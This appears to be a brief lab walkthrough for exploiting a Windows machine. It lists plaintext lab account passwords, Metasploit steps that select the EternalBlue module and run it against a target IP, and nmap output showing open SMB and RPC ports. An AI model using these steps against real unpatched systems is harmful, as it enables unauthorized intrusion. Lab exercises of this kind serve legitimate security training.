Password for 
user: 123
administrator: Password456!

1. Login to the Windows machine.
1. ```ipconfig``` in cmd to find IP address
1. Conduct nmap on the IP address
1. Start metasploit with ```msfconsole```
1. search eternal blue as microsoft-ds is exploitable and let mfsconsole do it's job.
1. ```
   use 0
   show options
   set RHOSTS (IP Adress)
   exploit
   ```

|PORT|      STATE SERVICE|      VERSION|
| :---: | :---: | :---:|
|135/tcp  | open | msrpc |       Microsoft Windows RPC
|139/tcp |  open | netbios-ssn | Microsoft Windows netbios-ssn
|445/tcp  | open  | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|49152/tcp | open | msrpc     |   Microsoft Windows RPC
|49153/tcp | open | msrpc     |   Microsoft Windows RPC
|49154/tcp | open | msrpc      |  Microsoft Windows RPC
|49155/tcp | open | msrpc       | Microsoft Windows RPC
|49156/tcp | open  | msrpc        Microsoft Windows RPC
|49157/tcp | open  | msrpc        Microsoft Windows RPC

